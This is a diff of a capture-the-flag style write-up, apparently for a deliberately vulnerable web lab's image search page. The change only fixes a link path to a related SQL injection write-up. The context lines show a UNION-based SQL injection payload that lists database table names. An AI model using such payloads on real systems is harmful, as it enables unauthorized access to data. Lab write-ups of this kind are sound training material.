@@ -2,7 +2,7 @@
 http://{IP_ADDRESS}/?page=searchimg
 ```
 
-Actually, everything proceeds the same as in the [SQL Injection Member](../SQL%20Injection%20Member/writeup.md) post.
+Actually, everything proceeds the same as in the [SQL Injection Member](../SQL%20Injection%20Member/Resources/writeup.md) post.
 
 ```
 1 UNION SELECT null, concat (table_name) from information_schema.tables where table_schema = database ()
